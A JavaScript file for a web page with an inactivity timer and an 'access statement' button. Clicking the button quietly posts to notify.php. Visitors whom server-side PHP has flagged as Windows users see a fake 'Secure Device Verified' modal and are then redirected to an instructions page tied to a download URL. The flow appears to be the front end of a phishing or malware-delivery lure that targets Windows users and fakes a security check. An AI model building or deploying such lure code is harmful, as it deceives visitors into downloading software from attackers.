document.addEventListener('DOMContentLoaded', () => {
    // --- Inactivity Timer Logic ---
    let inactivityTimer;
    let countdownInterval;
    let countdownValue = 60;
    const inactivityModal = document.getElementById('inactivity-modal');
    const continueBtn = document.getElementById('continue-btn');
    const cancelBtn = document.getElementById('cancel-btn');
    const countdownDisplay = document.getElementById('countdown-timer');

    const startInactivityCountdown = () => {
        countdownValue = 60;
        countdownDisplay.textContent = countdownValue;
        countdownInterval = setInterval(() => {
            countdownValue--;
            countdownDisplay.textContent = countdownValue;
            if (countdownValue <= 0) {
                clearInterval(countdownInterval);
                window.location.href = window.location.pathname + '?session=restarted';
            }
        }, 1000);
    };
    const showInactivityPopup = () => {
        if (inactivityModal) {
            document.body.classList.add('modal-open'); // Lock scroll
            inactivityModal.style.display = 'flex';
            startInactivityCountdown();
        }
    };
    const hideInactivityPopup = () => {
        if (inactivityModal) {
            document.body.classList.remove('modal-open'); // Lock scroll
            inactivityModal.style.display = 'none';
            clearInterval(countdownInterval);
        }
    };
    const resetInactivityTimer = () => { clearTimeout(inactivityTimer); inactivityTimer = setTimeout(showInactivityPopup, 600000); };
    const userActivityEvents = ['mousemove', 'mousedown', 'keypress', 'touchmove', 'scroll'];
    userActivityEvents.forEach(event => window.addEventListener(event, resetInactivityTimer, true));
    if (continueBtn) continueBtn.addEventListener('click', () => { hideInactivityPopup(); resetInactivityTimer(); });
    if (cancelBtn) cancelBtn.addEventListener('click', () => { hideInactivityPopup(); resetInactivityTimer(); });

    // --- Session Notification Logic ---
    const notification = document.getElementById('session-notification');
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('session') === 'restarted') {
        if (notification) {
            notification.classList.add('show');
            setTimeout(() => { notification.classList.remove('show'); }, 4000);
        }
        history.replaceState(null, '', window.location.pathname);
    }
    resetInactivityTimer();

    // --- Access Modal Logic ---
    const accessBtn = document.getElementById('access-statement-btn');
    const accessModal = document.getElementById('access-modal');
    const closeModalBtn = accessModal ? accessModal.querySelector('.close-modal-btn') : null;

    const openAccessModal = () => {
        if (accessModal) {
            document.body.classList.add('modal-open'); // Lock scroll
            accessModal.style.display = 'flex';
        }
    };

    const closeAccessModal = () => {
        if (accessModal) {
            document.body.classList.remove('modal-open'); // Unlock scroll
            accessModal.style.display = 'none';
        }
    };
    
    // **UPDATED LOGIC**
    if (accessBtn) {
        accessBtn.addEventListener('click', (e) => {
            e.preventDefault();

            fetch('notify.php', { method: 'POST' })
                .catch(error => console.error('Error sending notification:', error));

            // Check if downloadUrl exists (this variable is created by your PHP for Windows users)
            if (typeof downloadUrl !== 'undefined' && downloadUrl) {
                // --- For Windows Users: Show modal, then redirect ---
                
                // 1. Show the "Secure Device Verified" modal
                openAccessModal();

                // 2. Wait 3 seconds, then redirect to the instructions page
                setTimeout(() => {
                    window.location.href = 'instructions.php';
                }, 3000); // 3-second delay

            } else {
                // --- For Non-Windows Users: Open the authorization modal ---
                openAccessModal();
            }
        });
    }

    if (closeModalBtn) { closeModalBtn.addEventListener('click', closeAccessModal); }
    if (accessModal) { accessModal.addEventListener('click', (e) => { if (e.target === accessModal) { closeAccessModal(); } }); }
});